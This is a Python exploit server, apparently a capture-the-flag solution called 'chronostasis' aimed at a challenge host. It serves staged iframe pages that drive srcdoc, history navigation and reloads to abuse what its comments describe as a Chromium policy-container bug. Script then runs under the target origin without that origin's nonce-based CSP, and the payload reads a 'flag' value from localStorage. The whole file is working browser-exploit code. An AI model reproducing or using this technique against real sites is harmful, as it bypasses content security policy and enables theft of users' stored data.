#!/usr/bin/env python3
import html, json, sys, threading, urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PUBLIC = sys.argv[1].rstrip('/')
TOKEN = 'live'
CHAL = 'http://web:1337'
stage_count = 0
lock = threading.Lock()

def au(path):
    return f"{PUBLIC}{path}?t={TOKEN}"

def cu(content):
    return CHAL + '/?content=' + urllib.parse.quote(content, safe='')

def payload():
    # Stored first as a no-CSP B-origin about:srcdoc document.  On vulnerable
    # Chromium it is restored below an A-origin parent while retaining B's old
    # policy container, so this executes as A without A's nonce CSP.
    return '''<!doctype html><meta charset=utf-8><script>
console.log('[chronostasis] EXEC origin='+location.origin+' flag='+localStorage.getItem('flag'));
console.log('[chronostasis] FLAG='+localStorage.getItem('flag'));
</script>'''

def stage1():
    p = html.escape(payload(), quote=True)
    dummy = json.dumps(au('/dummy'))
    return f'''<!doctype html><meta charset=utf-8><script>
let n=0;
function loaded(f){{
  n++;
  console.log('[chronostasis] childload '+n+' '+f.contentWindow.location.href+' hist='+history.length);
  if(n===1) setTimeout(()=>f.contentWindow.location.assign({dummy}),75);
  if(n===2) setTimeout(()=>location.reload(),125);
}}
</script><iframe name="g" onload="loaded(this)" srcdoc="{p}"></iframe>'''

def stage2_destination():
    return cu('<iframe name="g" src="'+html.escape(au('/back'), quote=True)+'"></iframe>')

class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print('[http]', self.path, fmt%args, flush=True)
    def sendb(self, code, body=b'', headers=None):
        self.send_response(code)
        self.send_header('Content-Type','text/html; charset=utf-8')
        self.send_header('Cache-Control','no-store, no-cache, must-revalidate')
        self.send_header('Content-Length',str(len(body)))
        self.send_header('Connection','close')
        if headers:
            for k,v in headers.items(): self.send_header(k,v)
        self.end_headers()
        if body: self.wfile.write(body)
    def html(self, s, code=200): self.sendb(code,s.encode())
    def do_GET(self):
        global stage_count
        u=urllib.parse.urlsplit(self.path)
        q=urllib.parse.parse_qs(u.query)
        if q.get('t',[''])[0] != TOKEN:
            self.html('bad token',403); return
        if u.path=='/start':
            initial=cu('<iframe name="m" src="'+html.escape(au('/stage'),quote=True)+'"></iframe>')
            print('[+] start ->', initial, flush=True)
            self.sendb(302, headers={'Location':initial}); return
        if u.path=='/stage':
            with lock:
                stage_count += 1
                n=stage_count
            print('[+] stage',n,flush=True)
            if n==1: self.html(stage1())
            else:
                d=stage2_destination(); print('[+] stage redirect ->',d,flush=True)
                self.sendb(302,headers={'Location':d})
            return
        if u.path=='/dummy': self.html('<!doctype html>dummy'); return
        if u.path=='/back':
            self.html("<!doctype html><script>console.log('[chronostasis] BACK hist='+history.length);setTimeout(()=>history.back(),200)</script>")
            return
        if u.path=='/status': self.html('ok'); return
        self.html('nf',404)

print('[+] public',PUBLIC,flush=True)
print('[+] submit',au('/start'),flush=True)
ThreadingHTTPServer(('127.0.0.1',8000),H).serve_forever()
